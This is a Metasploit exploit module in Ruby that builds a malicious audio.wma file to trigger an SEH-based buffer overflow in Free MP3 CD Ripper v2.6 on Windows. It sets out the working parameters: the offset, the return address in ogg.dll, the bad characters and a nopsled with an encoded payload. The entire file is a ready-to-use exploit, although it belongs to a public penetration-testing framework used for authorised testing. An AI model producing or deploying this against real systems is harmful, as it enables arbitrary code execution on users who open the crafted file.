##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'              => 'Free MP3 CD Ripper Convert Overflow',
      'Description'       => %q{
        Free MP3 CD Ripper v2.6 has a buffer overflow vulnerability
        in its Convert functionality. This module generates a file
        that will trigger the vulnerability to run arbitrary code
        when the file is loaded using the Convert feature.

        This module has been test on Free MP3 CD Ripper v2.6 on
        Windows 10 x64.
      },
      'License'           => MSF_LICENSE,
      'Author'            => [
        'Gionathan "John" Reale', # Vulnerability Discovery and PoC
        'Jacob Robles'            # Metasploit Module
      ],
      'References'        => [
        ['EDB', '45412']
      ],
      'Payload'           => {
        'BadChars'        => "\x00\x0a\x0d\x2f"
      },
      'Platform'          => 'win',
      'Arch'              => ARCH_X86,
      'Targets'           => [
        ['Free MP3 CD Ripper 2.6',
          {
            'Ret'         => 0x66e42121, # POP EBX # POP EBP # RET [ogg.dll]
            'Offset'      => 4116
          }
        ]
      ],
      'DefaultOptions'    => {'FILENAME' => "audio.wma"},
      'DefaultTarget'     => 0,
      'DisclosureDate'    => 'Sep 13 2018'
    ))
  end

  def exploit
    data = make_nops(target['Offset'])
    data << generate_seh_record(target.ret)
    data << payload.encoded
    file_create(data)
  end
end
